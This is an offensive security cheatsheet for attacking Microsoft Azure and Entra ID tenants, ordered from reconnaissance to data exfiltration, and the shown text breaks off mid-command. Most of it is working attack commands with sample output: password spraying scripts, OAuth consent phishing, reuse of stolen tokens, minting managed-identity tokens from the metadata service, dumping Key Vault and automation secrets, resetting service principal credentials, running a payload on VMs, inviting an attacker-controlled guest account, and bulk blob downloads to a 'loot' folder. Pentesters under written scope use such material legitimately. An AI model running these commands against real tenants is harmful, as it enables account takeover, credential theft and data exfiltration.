<p align="center">
  <img src="https://cloudbreach.io/_next/image?q=75&url=%2FCloudBreach_logo.png&w=3840" alt="CloudBreach" width="420">
</p>

# Offensive Azure Security Cheatsheet

A methodology-ordered reference for offensive testing of Microsoft Azure and Microsoft 365 / Entra ID environments. Commands are grouped by the engagement stage they belong to: **Recon → Initial Access → Authentication & Tokens → Enumeration → Privilege Escalation → Lateral Movement → Data Exfiltration → Persistence**.

> **Authorized use only.** This material is for security professionals operating under an explicit, written scope of work (penetration test, red team, or research in a lab you own). Running these techniques against tenants or resources you do not have permission to test is illegal in most jurisdictions. Stay inside scope, log your actions, and use common sense.

> **Tooling note (2024–2026):** The legacy `MSOnline` and `AzureAD` PowerShell modules are **deprecated and retired** (MSOnline retired ~May 2025; AzureAD retired Q3 2025). Use the **Microsoft Graph PowerShell SDK** (`Connect-MgGraph`), **Microsoft Entra PowerShell**, the **Az** module, the **az CLI**, or token-driven tools like **GraphRunner**. Legacy `Get-Msol*` / `Get-AzureAD*` cmdlets appear below only as a mapping reference for older write-ups.

> **About the sample output:** All sample output below uses fictional, redacted values (fake GUIDs, `target.com` / `target.com` placeholders, truncated tokens, dummy secrets). It illustrates the *shape* of real responses so you can recognize results — it is not real data.

---

## Table of Contents

1. [Reconnaissance (Unauthenticated / OSINT)](#1-reconnaissance-unauthenticated--osint)
2. [Initial Access](#2-initial-access)
3. [Authentication & Token Handling](#3-authentication--token-handling)
4. [Enumeration (Authenticated)](#4-enumeration-authenticated)
5. [Privilege Escalation](#5-privilege-escalation)
6. [Lateral Movement](#6-lateral-movement)
7. [Data Exfiltration](#7-data-exfiltration)
8. [Persistence & Backdoors](#8-persistence--backdoors)
9. [Tooling Reference](#tooling-reference)
10. [Defensive / Detection Notes](#defensive--detection-notes)
11. [References](#references)

---

<br>

## 1. Reconnaissance (Unauthenticated / OSINT)

Map tenant metadata, public cloud endpoints, DNS records, exposed storage, and candidate usernames before authenticated testing.

### Quick commands

```powershell
Invoke-RestMethod "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"
Invoke-RestMethod "https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration"
Resolve-DnsName -Type MX target.com
Resolve-DnsName -Type TXT target.com
Resolve-DnsName target.sharepoint.com
Resolve-DnsName target.onmicrosoft.com
```

```powershell
Install-Module AADInternals -Scope CurrentUser
Import-Module AADInternals
Get-AADIntLoginInformation -UserName "user@target.com"
Get-AADIntTenantDomains -Domain "target.com"
```

```powershell
Import-Module .\MicroBurst.psm1
Invoke-EnumerateAzureSubDomains -Base target -Verbose
Invoke-EnumerateAzureBlobs -Base target
Invoke-EnumerateAzureBlobs -Base target -Permutations .\permutations.txt
python3 .\cloud_enum.py -k target --disable-aws --disable-gcp
```


### Tenant & federation discovery

**Check the realm type (Managed vs. Federated):**

```powershell
Invoke-RestMethod "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"
```

_Sample output (Managed tenant):_

```text
<?xml version="1.0" encoding="utf-8"?>
<RealmInfo Success="true">
  <State>3</State>
  <UserState>1</UserState>
  <Login>user@target.com</Login>
  <NameSpaceType>Managed</NameSpaceType>
  <DomainName>target.com</DomainName>
  <IsFederatedNS>false</IsFederatedNS>
  <FederationBrandName>Target Corp</FederationBrandName>
</RealmInfo>
```

> `NameSpaceType` of `Federated` (with an `AuthURL` pointing at an ADFS host) means auth happens on-prem — switch to ADFS-aware spraying. `Managed` means auth is in Entra ID directly.

**Recover the Tenant ID + OAuth endpoints:**

```powershell
Invoke-RestMethod "https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration"
```

_Sample output (trimmed):_

```text
{
  "token_endpoint": "https://login.microsoftonline.com/8f7e2c1a-4b3d-4a9e-bb20-1f2e3dxxxxxx/oauth2/v2.0/token",
  "issuer": "https://login.microsoftonline.com/8f7e2c1a-4b3d-4a9e-bb20-1f2e3dxxxxxx/v2.0",
  "authorization_endpoint": "https://login.microsoftonline.com/8f7e2c1a-4b3d-4a9e-bb20-1f2e3dxxxxxx/oauth2/v2.0/authorize",
  "tenant_region_scope": "EU"
}
```

> The GUID in `issuer`/`token_endpoint` is the **Tenant ID** (`8f7e2c1a-...` here).

### Public resource discovery (Google dorking & DNS)

| Query | Description |
|---|---|
| `site:github.com "DefaultEndpointsProtocol" "AccountKey"` | Find leaked storage-account connection strings in public repos. |
| `"<targetname>" inurl:blob.core.windows.net` | Locate Azure Blob storage endpoints tied to the target. |
| `*.azurewebsites.net`, `*.cloudapp.azure.com`, `*.database.windows.net`, `*.vault.azure.net` | Common Azure service DNS suffixes to pivot subdomain enumeration around. |

### Subdomain / service enumeration with MicroBurst

```powershell
Import-Module .\MicroBurst.psm1
Invoke-EnumerateAzureSubDomains -Base target.com -Verbose
```

_Sample output:_

```text
Subdomain                                 Service
---------                                 -------
target.com.onmicrosoft.com                Microsoft Hosted Domain
target.com.mail.protection.outlook.com    Email
target.com.sharepoint.com                 SharePoint
target.comstorage.blob.core.windows.net   Storage Accounts
target.com-api.azurewebsites.net          App Services
target.com-kv.vault.azure.net             Key Vaults
target.comdb.database.windows.net         Databases
```

```powershell
# Look for anonymously accessible storage blobs/containers
Invoke-EnumerateAzureBlobs -Base target.com
```

_Sample output:_

```text
Found Storage Account -  target.comstorage.blob.core.windows.net
Found Container - target.comstorage.blob.core.windows.net/backups
  -backups/db-2026-06-01.bak
  -backups/web.config
Found Container - target.comstorage.blob.core.windows.net/public
```

### Username harvesting

- Pull employee names/emails from LinkedIn, breach-dump indexes, and document metadata; format to the tenant's UPN scheme.
- Validate which harvested usernames exist before spraying (reduces noise and lockout risk). Tools such as **MSOLSpray**, **o365creeper**, and **TeamFiltration** support user validation.

---

<br>

## 2. Initial Access

Validate initial access paths such as credentials, device-code flows, OAuth consent, and mail-flow weaknesses within the approved scope.

### Quick commands

```powershell
az login --allow-no-subscriptions
az login -u "user@target.com" --allow-no-subscriptions
az account tenant list -o table
az account show -o jsonc
```

```powershell
Connect-MgGraph -Scopes "User.Read"
Get-MgContext
Connect-AzAccount -Tenant "target.com" -Subscription "<subscription-id>"
Get-AzContext
```

```powershell
az login --service-principal -u "<app-id>" -p "<client-secret>" --tenant "<tenant-id>" --allow-no-subscriptions
az role assignment list --assignee "<app-id>" --all -o table
az ad sp show --id "<app-id>"
```


### Password spraying

```powershell
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\users.txt -Password 'Spring2026!'
```

_Sample output:_

```text
[*] There are 25 total users to spray.
[*] Now spraying Microsoft Online.
[*] Current date/time: 06/17/2026 09:14:02
[+] VALID! user1@target.com : Spring2026!
[*] POTENTIALLY VALID (MFA)! user7@target.com : Spring2026!  (MFA required)
[*] user3@target.com appears to be LOCKED.
[*] Done. 1 valid, 1 MFA, 23 invalid.
```

```powershell
# Validate a single credential via az CLI (works even with no subscription)
az login -u "user1@target.onmicrosoft.com" -p 'Spring2026!' --allow-no-subscriptions
```

**Az PowerShell spray (effective in ADFS environments; one password per user via a passlist):**

```powershell
$userlist = Get-Content userlist.txt
$passlist = Get-Content passlist.txt   # one password per user, same order
$i = 0
foreach ($user in $userlist) {
    $pass = ConvertTo-SecureString $passlist[$i] -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ($user, $pass)
    try {
        Connect-AzAccount -Credential $cred -ErrorAction Stop -WarningAction SilentlyContinue
        Add-Content valid-creds.txt ("$user|" + $passlist[$i])
        Write-Host -ForegroundColor Green "[+] Valid: $user"
    } catch {
        if ($_.Exception -notmatch "ID3242") {   # ID3242 = bad creds; other errors may = valid creds + a condition
            Add-Content valid-creds.txt ("$user|" + $passlist[$i] + " => " + $_.Exception.Message)
        }
    }
    $i++
}
```

> Throttle sprays (long delays, few attempts per window) to avoid Smart Lockout. One password per spray round is the safe pattern.

### Device-code assessment with TokenTactics

Authorized simulation of device-code exposure using a lab/operator account. Do not relay codes to third parties, publish user-code delivery templates, or include token-capture/polling workflows in shared documentation. Record approvals, timestamps, source IPs, user agents, and expected Entra sign-in events.

```powershell
# TokenTactics reference check for an approved lab simulation
Import-Module .\TokenTactics.psd1
Get-Command -Module TokenTactics | Where-Object Name -like "*AzureToken*"
Get-Help Get-AzureToken -Detailed

# Only execute token-generation tests with your own approved lab/operator account.
# Do not relay the generated device code to a target user.
# Do not print, commit, or share access_token / refresh_token values.
```

_Sample report note:_

```text
Device-code flow was validated in an approved lab/operator account only.
No user-code relay template, credential prompt, or token polling workflow was included in the shared deliverable.
Recommended controls: phishing-resistant MFA, Conditional Access restrictions, sign-in log monitoring for device-code flow, and user training.
```

### OAuth consent / illicit grant phishing

Trick a user into consenting to an attacker-controlled app, granting delegated Graph scopes (mail, files) without capturing a password. GraphRunner automates the capture + token exchange:

```powershell
Invoke-InjectOAuthApp -AppName "Internal Reporting" -ReplyUrl https://your-listener/login `
  -Scope "openid profile offline_access Mail.Read Files.Read.All"
```

### Email spoofing test (mail-flow / direct-send misconfig)

```powershell
# Tests whether the tenant accepts unauthenticated direct-send / spoofed mail via its MX endpoint
Send-MailMessage -SmtpServer target-com.mail.protection.outlook.com `
  -To 'Recipient <user2@target.com>' -From 'Sender <user1@target.com>' `
  -Subject "Mail flow test" -Body "Authorized spoofing/direct-send test." -BodyAsHtml
```

---

<br>

## 3. Authentication & Token Handling

Load credentials, tokens, refresh tokens, and service-principal secrets into the right tooling context for controlled testing.

### Quick commands

```powershell
Get-AzContext
Get-AzContext -ListAvailable
Set-AzContext -SubscriptionId "<subscription-id>"
Save-AzContext -Path .\az-context.json
Import-AzContext -Path .\az-context.json
```

```powershell
az account list -o table
az account set --subscription "<subscription-id>"
az account get-access-token --resource https://management.azure.com/ -o json
az account get-access-token --resource https://graph.microsoft.com/ -o json
```


### Az PowerShell

```powershell
Import-Module Az
Connect-AzAccount                                            # interactive
$cred = Get-Credential; Connect-AzAccount -Credential $cred  # sometimes sidesteps MFA on legacy auth
Connect-AzAccount -AccessToken $mgmtToken -GraphAccessToken $graphToken -AccountId $accountId
Connect-AzAccount -AccessToken $mgmtToken -KeyVaultAccessToken $kvToken -AccountId $accountId
```

_Sample output:_

```text
Account                SubscriptionName   TenantId                               Environment
-------                ----------------   --------                               -----------
user1@target.com       Production         8f7e2c1a-4b3d-4a9e-bb20-1f2e3dxxxxxx   AzureCloud
```

### Token context import / export (stolen-token reuse)

```powershell
Save-AzContext -Path C:\Temp\token.json                       # export current context/token
Import-AzContext -Profile 'C:\Temp\Live Tokens\stolen.json'   # import a captured context file
Get-AzContext -ListAvailable
```

### az CLI

```powershell
az login
az login --allow-no-subscriptions
az login --service-principal -u $appId -p $secret --tenant $tenantId --allow-no-subscriptions
az account show
```

_Sample output of `az account show`:_

```text
{
  "environmentName": "AzureCloud",
  "id": "d8d9e3f0-1a2b-4c3d-9e8f-7a6b5cxxxxxx",
  "isDefault": true,
  "name": "Production Subscription",
  "state": "Enabled",
  "tenantId": "8f7e2c1a-4b3d-4a9e-bb20-1f2e3dxxxxxx",
  "user": { "name": "user1@target.com", "type": "user" }
}
```

### Microsoft Graph PowerShell SDK (modern replacement for MSOnline/AzureAD)

```powershell
Connect-MgGraph -Scopes "User.Read.All","Group.Read.All","Directory.Read.All"
Get-MgContext
Connect-MgGraph -AccessToken (ConvertTo-SecureString $graphToken -AsPlainText -Force)
```

### Refresh-token exchange (token-family pivoting)

```powershell
# GraphRunner: trade a refresh token for new access tokens against a different resource/client (FOCI abuse)
Invoke-RefreshGraphTokens -RefreshToken $rt -tenantid $tid
```

### Instance Metadata Service (IMDS) — managed identity tokens

From inside a compromised VM / App Service / Function / Automation worker, request tokens for the attached managed identity:

```powershell
Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' `
  -Method GET -Headers @{Metadata="true"} -UseBasicParsing | Select-Object -Expand Content
```

_Sample output:_

```text
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGci...xxxxxx",
  "client_id": "9b1c7d3e-2f4a-4d5b-8c6e-1a2b3cxxxxxx",
  "expires_in": "86399",
  "resource": "https://management.azure.com",
  "token_type": "Bearer"
}
```

```powershell
# Full instance metadata (subscription, RG, region, tags)
Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' `
  -Method GET -Headers @{Metadata="true"} -UseBasicParsing
```

> Swap the `resource=` value for `https://graph.microsoft.com`, `https://vault.azure.net`, or `https://storage.azure.com` to mint identity tokens for those services.

---

<br>

## 4. Enumeration (Authenticated)

Inventory identities, groups, roles, subscriptions, resources, apps, and data-plane access to identify reachable attack paths.

### Quick commands

```powershell
az group list -o table
az resource list -o table
az role assignment list --all -o table
az ad signed-in-user show -o jsonc
az ad user list --query "[].{UPN:userPrincipalName,DisplayName:displayName}" -o table
az ad group list --query "[].{Name:displayName,Id:id}" -o table
```

```powershell
Get-AzResourceGroup
Get-AzResource | Select-Object Name,ResourceType,ResourceGroupName
Get-AzRoleAssignment | Select-Object DisplayName,RoleDefinitionName,Scope
Get-MgUser -All | Select-Object DisplayName,UserPrincipalName
Get-MgGroup -All | Select-Object DisplayName,Id
```


### Account / context

```powershell
Get-AzSubscription
```

_Sample output:_

```text
Name         Id                                     TenantId                               State
----         --                                     --------                               -----
Production   d8d9e3f0-1a2b-4c3d-9e8f-7a6b5cxxxxxx   8f7e2c1a-4b3d-4a9e-bb20-1f2e3dxxxxxx   Enabled
Dev/Test     a1b2c3d4-5e6f-4a7b-8c9d-0e1f2axxxxxx   8f7e2c1a-4b3d-4a9e-bb20-1f2e3dxxxxxx   Enabled
```

```powershell
Get-AzRoleAssignment
```

_Sample output:_

```text
DisplayName    SignInName          RoleDefinitionName   Scope
-----------    ----------          ------------------   -----
John Doe       user1@target.com    Contributor          /subscriptions/d8d9e3f0-.../resourceGroups/RG-Prod
John Doe       user1@target.com    Reader               /subscriptions/d8d9e3f0-...
```

```powershell
az role definition list --custom-role-only -o json --query "[].{Name:roleName, Actions:permissions[0].actions}"
```

_Sample output:_

```text
[
  {
    "Name": "Backup Operator (custom)",
    "Actions": [
      "Microsoft.Storage/storageAccounts/read",
      "Microsoft.Storage/storageAccounts/listkeys/action",
      "Microsoft.KeyVault/vaults/read"
    ]
  }
]
```

### Fast resource sweep (Azure Resource Graph)

```powershell
Search-AzGraph -Query "Resources | summarize count() by type | sort by count_ desc"
```

_Sample output:_

```text
type                                          count_
----                                          ------
microsoft.compute/virtualmachines             14
microsoft.storage/storageaccounts              9
microsoft.web/sites                            7
microsoft.keyvault/vaults                      5
microsoft.sql/servers                          3
microsoft.automation/automationaccounts        2
```

```powershell
az graph query -q "Resources | where type =~ 'microsoft.compute/virtualmachines' | project name, resourceGroup, location"
```

### Resources & groups

```powershell
Get-AzResource | Select-Object Name, ResourceType, ResourceGroupName | Format-Table
```

_Sample output:_

```text
Name                  ResourceType                              ResourceGroupName
----                  ------------                              -----------------
target.comstorage     Microsoft.Storage/storageAccounts         RG-Prod
target.com-kv         Microsoft.KeyVault/vaults                 RG-Prod
web-prod-01           Microsoft.Compute/virtualMachines         RG-Prod
target.com-api        Microsoft.Web/sites                       RG-App
```

### Identity / directory (Entra ID)

Modern path — **Microsoft Graph PowerShell SDK**:

```powershell
Get-MgUser -All | Select-Object DisplayName, UserPrincipalName | Format-Table
```

_Sample output:_

```text
DisplayName    UserPrincipalName
-----------    -----------------
John Doe       user1@target.com
Jane Admin     admin@target.onmicrosoft.com
Svc Backup     svc-backup@target.com
```

```powershell
Get-MgDirectoryRole | Select-Object DisplayName, Id
Get-MgDirectoryRoleMember -DirectoryRoleId <role-id>
Get-MgServicePrincipal -All
Get-MgApplication -All
```

_Sample output of `Get-MgDirectoryRole`:_

```text
DisplayName               Id
-----------               --
Global Administrator      7b8a...
Helpdesk Administrator    9c4d...
Application Administrator  e2f1...
```

Az module equivalents (Az.Resources, still supported):

```powershell
Get-AzADUser
Get-AzADUser -UserPrincipalName admin@target.onmicrosoft.com
Get-AzADGroup
Get-AzADGroupMember -GroupObjectId <id>
Get-AzADServicePrincipal
```

Legacy (retired — reference only): `Get-MsolUser -All`, `Get-AzureADDirectoryRole`, `Get-AzureADDirectoryRole -ObjectId <id> | Get-AzureADDirectoryRoleMember`.

GraphRunner tenant recon (token-driven):

```powershell
Get-TenantInfo  -Tokens $tokens     # contact info, dir-sync, user self-service settings
Invoke-DumpApps -Tokens $tokens     # app registrations, consent grants, risky scopes
Get-DynamicGroups -Tokens $tokens   # dynamic groups whose rules may be abusable
```

### Storage accounts

```powershell
# Try with your AAD identity first
Get-AzStorageContainer -Context (New-AzStorageContext -StorageAccountName "target.comstorage" -UseConnectedAccount)
```

_Sample output (no data-plane RBAC):_

```text
Get-AzStorageContainer : This request is not authorized to perform this operation using this permission. HTTP Status Code: 403
```

```powershell
# Fall back to the account key (Contributor/Owner can read keys)
$key = (Get-AzStorageAccountKey -ResourceGroupName "RG-Prod" -Name "target.comstorage")[0].Value
$ctx = New-AzStorageContext -StorageAccountName "target.comstorage" -StorageAccountKey $key
Get-AzStorageContainer -Context $ctx
```

_Sample output:_

```text
Name        PublicAccess   LastModified
----        ------------   ------------
backups     Off            6/1/2026 2:14:09 AM +00:00
configs     Off            5/12/2026 9:02:51 AM +00:00
public      Blob           4/30/2026 1:44:00 PM +00:00
```

```powershell
Get-AzStorageBlob -Container "backups" -Context $ctx
```

_Sample output:_

```text
Name                 BlobType    Length      ContentType
----                 --------    ------      -----------
db-2026-06-01.bak    BlockBlob   1048576000  application/octet-stream
web.config           BlockBlob   2048        text/xml
```

```powershell
az storage account list --query "[*].{Name:name, Loc:primaryLocation, Kind:kind}" -o table
```

_Sample output:_

```text
Name                Loc          Kind
------------------  -----------  ---------
target.comstorage   westeurope   StorageV2
target.comlogs      northeurope  StorageV2
```

### Key Vaults

```powershell
Get-AzKeyVault
Get-AzKeyVaultSecret -VaultName target.com-kv
```

_Sample output of `Get-AzKeyVaultSecret`:_

```text
Name             Enabled   Expires   Created
----             -------   -------   -------
SqlAdminPass     True                6/2/2026 10:11:00 AM
StorageConnStr   True                5/18/2026  3:40:12 PM
ApiKey-Stripe    True                4/01/2026  8:22:55 AM
```

```powershell
Get-AzKeyVaultSecret -VaultName target.com-kv -Name SqlAdminPass -AsPlainText
```

_Sample output:_

```text
S4mple-Sql-Admin-Pass-Redacted!
```

```powershell
az keyvault secret show --id https://target.com-kv.vault.azure.net/secrets/SqlAdminPass | ConvertFrom-Json
```

### Virtual machines & networking

```powershell
Get-AzVM | Select-Object Name, ResourceGroupName, Location | Format-Table
```

_Sample output:_

```text
Name          ResourceGroupName   Location
----          -----------------   --------
web-prod-01   RG-Prod             westeurope
db-prod-01    RG-Prod             westeurope
jump-01       RG-Mgmt             westeurope
```

```powershell
Get-AzVirtualNetwork
Get-AzPublicIpAddress
Get-AzExpressRouteCircuit      # hybrid links
Get-AzVpnConnection
Get-AzAksCluster               # Kubernetes
Get-AzContainerRegistry        # ACR
```

### Web apps, Function apps & SQL

```powershell
Get-AzWebApp
Get-AzSQLServer
Get-AzSqlServerFirewallRule -ServerName $srv -ResourceGroupName $rg
Get-AzSqlServerActiveDirectoryAdministrator -ServerName $srv -ResourceGroupName $rg
```

Pillage Function App settings/connection strings across all subscriptions:

```powershell
$subs = Get-AzSubscription
foreach ($s in $subs) {
    Select-AzSubscription -Subscription $s.SubscriptionId | Out-Null
    foreach ($f in (Get-AzFunctionApp)) {
        $f.EnabledHostname
        $f.ApplicationSettings        # often holds secrets / connection strings
    }
}
```

_Sample output:_

```text
target.com-fn.azurewebsites.net
Key                       Value
---                       -----
AzureWebJobsStorage       DefaultEndpointsProtocol=https;AccountName=target.comstorage;AccountKey=...REDACTED...
SqlConnectionString       Server=target.comdb.database.windows.net;User ID=sa;Password=...REDACTED...
```

### Kubernetes (from a compromised pod or with kubeconfig)

```powershell
kubectl get pods
kubectl auth can-i --list      # what the current service account can do
```

_Sample output of `kubectl get pods`:_

```text
NAME                        READY   STATUS    RESTARTS   AGE
api-deploy-7c9f8b6d-2xk4q   1/1     Running   0          5d
api-deploy-7c9f8b6d-9pl2r   1/1     Running   0          5d
redis-0                     1/1     Running   0          12d
```

---

<br>

## 5. Privilege Escalation

Review misconfigured roles, service principals, Key Vault access, automation assets, and identity paths that may increase privilege.

### Quick commands

```powershell
az role assignment list --assignee "<object-id-or-upn>" --all -o table
az role definition list --custom-role-only true -o table
az keyvault list -o table
az keyvault show --name "<vault-name>" --query properties.enableRbacAuthorization
az ad app list --query "[].{Name:displayName,AppId:appId}" -o table
az ad sp list --query "[].{Name:displayName,AppId:appId}" -o table
```

```powershell
Get-AzRoleDefinition | Where-Object {$_.IsCustom -eq $true}
Get-AzRoleAssignment -Scope "/subscriptions/<subscription-id>"
Get-AzKeyVault | Select-Object VaultName,ResourceGroupName,EnabledForDeployment
Get-MgServicePrincipal -All | Select-Object DisplayName,AppId,Id
Get-MgApplication -All | Select-Object DisplayName,AppId,Id
```


### Hunt for credentials already in the directory

```powershell
# Search every Entra user attribute for "password" strings (Graph SDK port of the classic one-liner)
$users = Get-MgUser -All -Property *
foreach ($u in $users) {
    $u.PSObject.Properties | Where-Object { $_.Value -like "*password*" } |
      ForEach-Object { "[*] $($u.UserPrincipalName) [$($_.Name)] : $($_.Value)" }
}
```

_Sample output:_

```text
[*] svc-backup@target.com [Description] : Backup svc account - initial password Backup#Wintxxxxxx
```

### Service principal credential reset (classic escalation path)

```powershell
az ad sp credential reset --id 55556666-aaaa-bbbb-cccc-123456xxxxxx
```

_Sample output:_

```text
{
  "appId": "55556666-aaaa-bbbb-cccc-123456xxxxxx",
  "password": "Xy9~SampleResetSecret-Rexxxxxx",
  "tenant": "8f7e2c1a-4b3d-4a9e-bb20-1f2e3dxxxxxx"
}
```

```powershell
az login --service-principal -u "55556666-aaaa-bbbb-cccc-123456xxxxxx" `
  -p "Xy9~SampleResetSecret-Rexxxxxx" --tenant 8f7e2c1a-... --allow-no-subscriptions
```

### Key Vault policy abuse (Contributor → secrets)

Contributor on a vault doesn't grant data-plane reads — but it can grant itself one:

```powershell
az keyvault set-policy --name target.com-kv --upn you@target.com `
  --secret-permissions get list --key-permissions get list --certificate-permissions get list
az keyvault secret list --vault-name target.com-kv --query '[].id' -o tsv
```

_Sample output:_

```text
https://target.com-kv.vault.azure.net/secrets/SqlAdminPass
https://target.com-kv.vault.azure.net/secrets/StorageConnStr
```

### Automation Account → runbook / hybrid worker abuse

```powershell
Get-AzAutomationAccount
Get-AzAutomationRunbook -AutomationAccountName <acct> -ResourceGroupName <rg>
Export-AzAutomationRunbook -AutomationAccountName <acct> -ResourceGroupName <rg> -Name <runbook> -OutputFolder .\
Get-AzAutomationJobOutput -AutomationAccountName <acct> -ResourceGroupName <rg> -JobId <jobId>   # job output can leak secrets
```

_Sample output of `Get-AzAutomationAccount`:_

```text
AutomationAccountName   ResourceGroupName   Location
---------------------   -----------------   --------
target.com-auto         RG-Mgmt             westeurope
```

### MicroBurst credential pillaging

```powershell
Get-AzPasswords -Verbose            # dumps Automation creds, Key Vault secrets, App Service configs, etc.
```

_Sample output:_

```text
[+] Getting List of Key Vaults...
    [+] Exporting Key Vault secret: target.com-kv/SqlAdminPass
[+] Getting List of Automation Accounts...
    [+] Found credential: target.com-auto/DeploySvc
[*] Dumped credentials written to AzurePasswords.csv

Type           Name                       Value
----           ----                       -----
Key Vault      SqlAdminPass               S4mple-Sql-Admin-Pass-Redacted!
Automation     DeploySvc                  deploy / Depl0y-Sample-Redacted
App Service    target.com-api/Conn        Server=...;Password=...REDACTED...
```

### Dynamic group / role-assignable group abuse

Use `Get-DynamicGroups` (GraphRunner) to find groups whose membership rule you can satisfy (e.g. a `user.mail -contains` rule) and that are tied to a privileged role, then meet the rule to inherit the role.

---

<br>

## 6. Lateral Movement

Move laterally between cloud identities, resources, subscriptions, managed identities, and hybrid connectivity where permitted.

### Quick commands

```powershell
az vm list -d -o table
az network vnet list -o table
az network peering list --resource-group "<rg>" --vnet-name "<vnet>" -o table
az webapp list -o table
az functionapp list -o table
az aks list -o table
```

```powershell
Get-AzVM -Status | Select-Object Name,ResourceGroupName,PowerState
Get-AzVirtualNetwork | Select-Object Name,ResourceGroupName,Location
Get-AzVirtualNetworkPeering -VirtualNetworkName "<vnet>" -ResourceGroupName "<rg>"
Get-AzWebApp | Select-Object Name,ResourceGroup,DefaultHostName
Get-AzAksCluster | Select-Object Name,ResourceGroupName,KubernetesVersion
```


### Run commands on VMs (compute → code execution)

```powershell
# Requires Microsoft.Compute/virtualMachines/runCommand/action (e.g. VM Contributor)
Invoke-AzVMRunCommand -ResourceGroupName RG-Prod -VMName web-prod-01 -CommandId RunPowerShellScript -ScriptPath ./payload.ps1
```

_Sample output:_

```text
Value[0] :
  Code    : ComponentStatus/StdOut/succeeded
  Level   : Info
  Message : nt authority\system
            web-prod-01
Value[1] :
  Code    : ComponentStatus/StdErr/succeeded
  Level   : Info
  Message :
Status   : Succeeded
```

```powershell
az vm run-command invoke -g RG-Prod -n web-prod-01 --command-id RunShellScript --scripts "id; hostname"
```

### Pivot via managed identity (resource → cloud identity)

After landing on a VM/App/Function/Automation worker, mint tokens from IMDS (section 3) and use them to reach ARM, Graph, Key Vault, or Storage as that managed identity — often more privileged than the initial foothold.

### Management group pivots

```powershell
az account management-group list -o table
az account management-group show --name "<group-id>"
az role assignment list --scope "/providers/Microsoft.Management/managementGroups/<group-id>" --all -o table
```

### Cross-subscription movement

```powershell
$currentAccount = (Get-AzContext).Account.Id

Get-AzSubscription | ForEach-Object {
    $subscription = $_
    Set-AzContext -SubscriptionId $subscription.Id | Out-Null

    Get-AzRoleAssignment -SignInName $currentAccount |
        Select-Object @{Name='Subscription';Expression={$subscription.Name}}, RoleDefinitionName, Scope
}
```

_Sample output:_

```text
Subscription            RoleDefinitionName   Scope
------------            ------------------   -----
Production Subscription Reader               /subscriptions/d8d9e3f0-1a2b-4c3d-9e8f-7a6b5cxxxxxx
Production Subscription Contributor          /subscriptions/d8d9e3f0-1a2b-4c3d-9e8f-7a6b5cxxxxxx/resourceGroups/RG-App
Dev/Test Subscription   Virtual Machine User Login /subscriptions/a1b2c3d4-5e6f-4a7b-8c9d-0e1f2axxxxxx/resourceGroups/RG-Dev/providers/Microsoft.Compute/virtualMachines/dev-jump-01
```

### Guest invite (expand foothold into the tenant)

```powershell
$Body="{'invitedUserEmailAddress':'you@attacker.com','inviteRedirectUrl':'https://portal.azure.com'}"
az rest --method POST --uri https://graph.microsoft.com/v1.0/invitations `
  --headers "Content-Type=application/json" --body $Body
```

_Sample output:_

```text
{
  "invitedUserEmailAddress": "you@attacker.com",
  "inviteRedeemUrl": "https://login.microsoftonline.com/redeem?rd=https%3a%2f%2finvitations...TRUNCATED...",
  "status": "PendingAcceptance"
}
```

> Browse `inviteRedeemUrl` to accept and gain a guest identity in the tenant.

### Hybrid / on-prem reach

Inspect ExpressRoute (`Get-AzExpressRouteCircuit`), VPN (`Get-AzVpnConnection`), and Hybrid Runbook Workers / Arc-enabled servers to find routes from the cloud tenant back into the corporate network.

### Graph-based collection with AzureHound

Collect Entra ID and AzureRM relationships for BloodHound attack-path analysis.

```powershell
# Check the collector
.\azurehound.exe --version
.\azurehound.exe --help

# Reuse the current az CLI Graph token for Entra ID collection
$GraphToken = az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv
.\azurehound.exe --jwt $GraphToken list az-ad -o azurehound-azad.json -v 2

# Collect AzureRM data when the signed-in identity has subscription read access
$ArmToken = az account get-access-token --resource https://management.azure.com --query accessToken -o tsv
.\azurehound.exe --jwt $ArmToken list az-rm -o azurehound-azrm.json -v 2

# Scope AzureRM collection to a known subscription
.\azurehound.exe --jwt $ArmToken list az-rm -b "d8d9e3f0-1a2b-4c3d-9e8f-7a6b5cxxxxxx" -o azurehound-subscription.json -v 2

# Service-principal collection for approved assessment accounts
.\azurehound.exe -a "55556666-aaaa-bbbb-cccc-123456xxxxxx" -s "<client-secret>" -t "target.com" list -o azurehound-sp.json -v 2
```

_Sample output:_

```text
INFO  collecting azure objects...
INFO  collected 312 users, 47 groups, 88 service principals, 14 VMs, 9 key vaults
INFO  finished collection in 41.2s — wrote azurehound-azad.json
```

```powershell
# Import the JSON files into BloodHound CE / Enterprise, then review common Azure paths
# Examples: AZGlobalAdmin, AZOwns, AZUserAccessAdministrator, AZRunsAs, AZAddSecret
```

> Log the operator identity, source IP, tenant, subscription scope, and output file names for cleanup and reporting.

---

<br>

## 7. Data Exfiltration

Collect only in-scope evidence from reachable storage, secrets, collaboration data, and databases for validation and reporting.

### Quick commands

```powershell
az storage account list -o table
az storage container list --account-name "<storage-account>" --auth-mode login -o table
az storage blob list --account-name "<storage-account>" --container-name "<container>" --auth-mode login -o table
az keyvault secret list --vault-name "<vault-name>" -o table
az sql server list -o table
az sql db list --server "<sql-server>" --resource-group "<rg>" -o table
```

```powershell
Get-AzStorageAccount | Select-Object StorageAccountName,ResourceGroupName,Location
Get-AzKeyVaultSecret -VaultName "<vault-name>"
Get-AzSqlServer | Select-Object ServerName,ResourceGroupName,Location
Get-AzSqlDatabase -ServerName "<sql-server>" -ResourceGroupName "<rg>"
```


### Storage blobs

```powershell
az storage blob download --account-name target.comstorage --container-name backups `
  --name db-2026-06-01.bak --file ./loot/db.bak
az storage blob download-batch --account-name target.comstorage --source backups --destination ./loot/
```

_Sample output:_

```text
Finished[#############################################################]  100.0000%
{
  "lastModified": "2026-06-01T02:14:09+00:00",
  "name": "db-2026-06-01.bak",
  "size": 1048576000
}
```


### Storage blob versions

Blob versioning can expose older copies of in-scope files. List versions first, then download the exact previous version needed for evidence.

```powershell
az storage blob list --account-name target.comstorage --container-name backups `
  --include v --auth-mode login `
